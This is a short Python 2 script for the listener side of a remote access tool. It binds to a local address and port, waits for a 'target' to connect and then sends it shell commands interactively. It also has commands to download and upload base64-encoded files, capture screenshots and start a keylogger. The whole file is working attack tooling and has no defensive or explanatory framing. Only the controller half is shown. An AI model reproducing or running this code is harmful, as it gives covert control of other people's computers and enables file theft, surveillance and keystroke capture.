#!/usr/bin/python
import socket
import json
import base64

def reliable_send(data):
	json_data = json.dumps(data)
	target.send(json_data)

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + target.recv(1024)
			return json.loads(json_data)
		except ValueError:
			continue


def connection_open():
	#global variables
	global s
	global ip
	global target
	#creating the socket
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	#bind the socket to an address and a port
	s.bind(("192.168.1.6", 54321))
	#listening for the incoming connection
	s.listen(5) #listen for 5 connections for example
	print("Listening for incoming connections...")
	#accept the connection --> target (socket) and the ip adress
	target, ip = s.accept()
	print("Target connected.")

def commands():
	count = 1
	#send commands to the client
	while True:
		command = raw_input("* Shell#~ %s " %str(ip))
		reliable_send(command)
		if command == "exit":
			break
		elif command[:2] == "cd" and len(command) > 1:
			continue
		elif command[:8] == "download":
			with open(command[9:], "wb") as file:
				answer = reliable_recv()
				file.write(base64.b64decode(answer))
		elif command[:6] == "upload":
			try:
				with open(command[7:], "rb") as fin:
					crypt = base64.b64encode(fin.read())
					reliable_send(crypt)
			except:
				failed = "Failed to upload the file"
				reliable_send(base64.b64encode(failed))
		elif command[:10] == "screenshot":
			with open("screenshot%d" % count, "wb") as screen:
				image = reliable_recv()
				image_decoded = base64.b64decode(image)
				if image_decoded[:2] == "[!":
					print(image_decoded)
				else:
					screen.write(image_decoded)
					count += 1
		elif command[:15] == "keylogger start":
			continue
		else:
			answer = reliable_recv()
			print(answer)

def connection_close():
	print("Closing connection to the client")
	s.close()

connection_open()
commands()
connection_close()
